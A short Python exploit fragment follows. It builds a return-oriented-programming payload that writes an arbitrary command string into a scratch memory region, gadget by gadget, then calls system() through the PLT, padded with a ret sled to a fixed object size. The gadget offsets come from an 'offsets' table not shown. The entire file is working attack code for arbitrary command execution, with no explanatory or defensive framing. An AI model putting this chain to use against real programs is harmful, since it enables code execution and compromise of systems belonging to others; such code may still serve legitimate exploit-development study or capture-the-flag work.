import struct

def p64(value):
    return struct.pack("<Q", value)

def build_rop_payload(command: str) -> bytes:
    obj_size = 0xF000

    def arbw(dst: int, val: bytes) -> bytes:
        if len(val) > 8:
            raise ValueError("arbw chunks must be at most 8 bytes")
        val = val.ljust(8, b"\x00")

        ret = b""
        ret += p64(offsets["pop_rdi_ret"])
        ret += p64(dst)
        ret += p64(offsets["pop_rsi_ret"])
        ret += val
        ret += p64(offsets["write_rdi_rsi_ret"])
        return ret

    command_bytes = command.encode("utf-8") + b"\x00"
    obj = b""
    for offset in range(0, len(command_bytes), 8):
        obj += arbw(offsets["scratch_space"] + offset, command_bytes[offset : offset + 8])
    obj += p64(offsets["pop_rdi_ret"])
    obj += p64(offsets["scratch_space"])
    obj += p64(offsets["system_plt"])
    if len(obj) > obj_size:
        raise ValueError(f"ROP payload is too large: command_len={len(command_bytes) - 1} chain_len={len(obj)} max={obj_size}")

    while len(obj) < obj_size:
        obj = p64(offsets["ret"]) + obj

    return obj

